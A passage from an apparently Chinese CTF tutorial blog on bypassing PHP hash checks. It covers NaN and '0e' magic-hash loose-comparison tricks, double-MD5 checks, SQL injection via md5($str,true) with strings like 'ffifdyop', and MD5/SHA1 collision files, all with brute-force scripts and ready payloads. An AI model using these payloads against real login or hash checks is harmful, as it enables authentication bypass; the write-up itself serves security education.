class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure><p>这里我们抛开反序列化不谈，这题本质上需要我们构造<code>trick1=NAN</code>，<code>trick2=NAN</code>即可绕过。原理也很简单，NaN与所有值都不相等，包括它自己。当然也可以用INF绕过，原理类似，这里不过多赘述</p><h2 id="案例2——强网杯2020——Funhash"><a href="#案例2——强网杯2020——Funhash" class="headerlink" title="案例2——强网杯2020——Funhash"></a>案例2——强网杯2020——Funhash</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure><p>这里重点关注<code>level 1</code>，其他两关都是老生常谈的东西，无须过多赘述。这里我已经写好了脚本，下次遇到这种<code>md4</code>的题目直接爆破干它</p><p><strong>下面给出我已经爆破好的例子：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0e251288019</span><br><span class="line">0e898201062</span><br></pre></td></tr></table></figure><p><strong>exp.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"0123456789"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calc_md4</span><span class="params">($s)</span></span>&#123;</span><br><span class="line">    $s = <span class="string">"0e"</span>.$s;</span><br><span class="line">    $md4 = hash(<span class="string">"md4"</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> (substr($md4, <span class="number">0</span>, <span class="number">2</span>) === <span class="string">"0e"</span> &amp;&amp; ctype_digit(substr($md4, <span class="number">2</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $s.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getstr</span><span class="params">($payload,$s,$slen)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($s) == $slen)&#123;</span><br><span class="line">        calc_md4($s);</span><br><span class="line"><span class="keyword">return</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt;strlen($payload);$i++)&#123;</span><br><span class="line"></span><br><span class="line">        $sl = $s.$payload[$i];</span><br><span class="line">        getstr($payload, $sl, $slen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串长度从3到30，肯定找得到</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">3</span>;$i&lt;<span class="number">30</span>;$i++)&#123;</span><br><span class="line">    getstr($payload,<span class="string">''</span>,$i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="案例3——NJUPT2019南邮校赛——easyphp"><a href="#案例3——NJUPT2019南邮校赛——easyphp" class="headerlink" title="案例3——NJUPT2019南邮校赛——easyphp"></a>案例3——NJUPT2019南邮校赛——easyphp</h2><p>这里我截取了一部分代码，用作案例讲解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的关键就是，需要我们找两个个是<code>ce</code>开头的，然后<code>ce</code>后面是纯数字的md5值</p><p><strong>下面给出我已经爆破好的例子：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">N9KU3</span><br><span class="line">QlYRH</span><br></pre></td></tr></table></figure><p>爆破的脚本如下</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">payload = string.ascii_letters+string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    md5 = hashlib.md5(s.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (md5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">"ce"</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit()) :</span><br><span class="line">        print(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getstr</span><span class="params">(payload,s,slen)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(len(s) == slen):</span><br><span class="line">        calc_md5(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">        sl = s+i</span><br><span class="line">        getstr(payload, sl, slen)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 字符串长度从0到30，肯定找得到</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">30</span>):</span><br><span class="line">    getstr(payload,<span class="string">''</span>,i)</span><br></pre></td></tr></table></figure><h2 id="案例4——双MD5碰撞绕过"><a href="#案例4——双MD5碰撞绕过" class="headerlink" title="案例4——双MD5碰撞绕过"></a>案例4——双MD5碰撞绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">    $b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($a != $b &amp;&amp; md5($a) == md5(md5($b))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag&#123;XXXXX&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"wrong!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里其实我们只要找出<code>md5(md5($b))</code>是<code>0e</code>开头的且<code>0e</code>后面是纯数字的字符串即可</p><p><strong>下面给出我已经爆破好的例子：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f2WfQ</span><br><span class="line">iv2Cn</span><br></pre></td></tr></table></figure><p>爆破脚本如下：</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">payload = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    md5 = hashlib.md5(s.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line">    md5_double = hashlib.md5(md5.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (md5_double[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">"0e"</span> <span class="keyword">and</span> md5_double[<span class="number">2</span>:].isdigit()):</span><br><span class="line">        print(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getstr</span><span class="params">(payload, s, slen)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (len(s) == slen):</span><br><span class="line">        calc_md5(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">        sl = s + i</span><br><span class="line">        getstr(payload, sl, slen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串长度从0到30，肯定找得到</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">30</span>):</span><br><span class="line">    getstr(payload, <span class="string">''</span>, i)</span><br></pre></td></tr></table></figure><h2 id="案例5——php中md5-str-true-注入"><a href="#案例5——php中md5-str-true-注入" class="headerlink" title="案例5——php中md5($str,true)注入"></a>案例5——php中md5($str,true)注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">    $result = mysqli_query($link,$sql);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Success'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Failure'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里md5输出的是16 字符二进制格式，并不是我们平时看到的32字符十六进制数，所以我们只需要找md5加密后字符串中是否存在<code>&#39;or&#39;</code>字符串</p><p><strong>下面给出我已经爆破好的例子：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">4SV7p</span><br><span class="line">bJm4aG</span><br><span class="line">bNas5p</span><br><span class="line">ckHAEb</span><br></pre></td></tr></table></figure><p><strong>exp.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calc_md5_true</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $md5_true = md5($s,<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (strpos($md5_true,<span class="string">"'or'"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $s.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getstr</span><span class="params">($payload, $s, $slen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strlen($s) == $slen) &#123;</span><br><span class="line">        calc_md5_true($s);</span><br><span class="line">        <span class="keyword">return</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($payload); $i++) &#123;</span><br><span class="line"></span><br><span class="line">        $sl = $s . $payload[$i];</span><br><span class="line">        getstr($payload, $sl, $slen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串长度从3到30，肯定找得到</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">3</span>; $i &lt; <span class="number">30</span>; $i++) &#123;</span><br><span class="line">    getstr($payload, <span class="string">''</span>, $i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="案例6——强网杯2018——Web-签到"><a href="#案例6——强网杯2018——Web-签到" class="headerlink" title="案例6——强网杯2018——Web 签到"></a>案例6——强网杯2018——Web 签到</h2><p>这里选取了部分代码，用作演示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里因为对两个参数都进行了强制类型转换，所以一般的方法（用数组报错绕过肯定是行不通的了），所以我们必须找到两个文件，他们的内容不一样，但是md5值相等</p><p>在网上找到两张图片，他们内容不一样，但是md5值一样</p><p><img src="http://images.xianyu123.club/20200826171352.jpg" alt="double_md5_1"></p><p><img src="http://images.xianyu123.club/20200826171357.jpg" alt="double_md5_2"></p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">url = <span class="string">'http://localhost:82/WWW/test2.php'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'double_md5_1.jpg'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    md51 = f.read()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'double_md5_2.jpg'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    md52 = f.read()</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'param1'</span>:md51,<span class="string">'param2'</span>:md52&#125;</span><br><span class="line">r = req.post(url=url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="案例7——md5-a-与md5-md5-a-都是0e开头的字符串"><a href="#案例7——md5-a-与md5-md5-a-都是0e开头的字符串" class="headerlink" title="案例7——md5($a)与md5(md5($a))都是0e开头的字符串"></a>案例7——md5($a)与md5(md5($a))都是0e开头的字符串</h2><p><strong>下面给出我已经爆破好的例子：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">payload = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    md5 = hashlib.md5(s.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line">    md5_double = hashlib.md5(md5.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (md5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">"0e"</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit() <span class="keyword">and</span> md5_double[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">"0e"</span> <span class="keyword">and</span> md5_double[<span class="number">2</span>:].isdigit()):</span><br><span class="line">        print(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getstr</span><span class="params">(payload, s, slen)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (len(s) == slen):</span><br><span class="line">        calc_md5(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">        sl = s + i</span><br><span class="line">        getstr(payload, sl, slen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串长度从0到30，肯定找得到</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">30</span>):</span><br><span class="line">    getstr(payload, <span class="string">''</span>, i)</span><br></pre></td></tr></table></figure><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="三张图片碰撞"><a href="#三张图片碰撞" class="headerlink" title="三张图片碰撞"></a>三张图片碰撞</h3><p>在上个案例中，只是两张图片碰撞。这里我们思考一个问题，如果是三张图片呢，是否存在？答案是存在的</p><p><img src="http://images.xianyu123.club/20200826172135.jpg" alt="three_md5_1"></p><p><img src="http://images.xianyu123.club/20200826172236.jpg" alt="three_md5_2"></p><p><img src="http://images.xianyu123.club/20200826172240.jpg" alt="three_md5_3"></p><h3 id="两个其他类型的文件md5碰撞"><a href="#两个其他类型的文件md5碰撞" class="headerlink" title="两个其他类型的文件md5碰撞"></a>两个其他类型的文件md5碰撞</h3><p>首先下载<a href="https://github.com/cr-marcstevens/hashclash" target="_blank" rel="noopener">hashclash</a>，如果是linux环境的话可以下载编译好的二进制文件，如果是macos系统的话，就需要下载源码，然后自行编译，编译成功如下：</p><p><img src="http://images.xianyu123.club/20200828160628.png" alt="image-20200828160628187"></p><h4 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir ipc_workdir</span><br><span class="line"></span><br><span class="line">cd ipc_workdir</span><br></pre></td></tr></table></figure><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;TEST&quot; &gt; prefix.txt</span><br><span class="line"></span><br><span class="line">../scripts/poc_no.sh prefix.txt</span><br></pre></td></tr></table></figure><p>稍等片刻后，就可以碰撞出来了</p><p><img src="http://images.xianyu123.club/20200828164834.png" alt="image-20200828164834105"></p><h3 id="php文件的md5碰撞"><a href="#php文件的md5碰撞" class="headerlink" title="php文件的md5碰撞"></a>php文件的md5碰撞</h3><p><strong>下载文件：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://s3-eu-west-1.amazonaws.com/md5collisions/a.php</span><br><span class="line"></span><br><span class="line">wget https://s3-eu-west-1.amazonaws.com/md5collisions/b.php</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20200828205602.png" alt="image-20200828205602032"></p><p><a href="https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html" target="_blank" rel="noopener">How I made two PHP files with the same MD5 hash</a></p><h3 id="sha1碰撞"><a href="#sha1碰撞" class="headerlink" title="sha1碰撞"></a>sha1碰撞</h3><p><strong>下载文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sSO https://shattered.it/static/shattered-1.pdf</span><br><span class="line"></span><br><span class="line">curl -sSO https://shattered.it/static/shattered-2.pdf</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20200828173329.png" alt="image-20200828173329579"></p><h3 id="任意多个文件，文件内容不同，md5值相同"><a href="#任意多个文件，文件内容不同，md5值相同" class="headerlink" title="任意多个文件，文件内容不同，md5值相同"></a>任意多个文件，文件内容不同，md5值相同</h3><p><strong>运用的原理如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(file + col1_a + col2_a) === MD5(file + col1_a + col2_b) === MD5(file + col1_b + col2_a) === MD5(file + col1_b + col2_b)</span><br></pre></td></tr></table></figure><p>这里使用的工具还是<strong>hashclash</strong></p><p>我们在在<strong>hashclash</strong>文件夹下创建工作目录，然后执行下面的shell脚本</p><p><strong>gen.sh</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">../bin/md5_fastcoll test.txt -o test_1.txt test_2.txt</span><br><span class="line">../bin/md5_fastcoll test_1.txt -o test_1_1.txt test_1_2.txt</span><br><span class="line">../bin/md5_fastcoll test_1_1.txt -o test_1_1_1.txt test_1_1_2.txt</span><br><span class="line">./genfiles.py</span><br></pre></td></tr></table></figure><p><strong>genfiles.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"test.txt"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    base = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test_1.txt"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_1 = f.read()</span><br><span class="line">    coll_1 = file_1[len(base):]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test_2.txt"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_2 = f.read()</span><br><span class="line">    coll_2 = file_2[len(base):]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test_1_1.txt"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_1_1 = 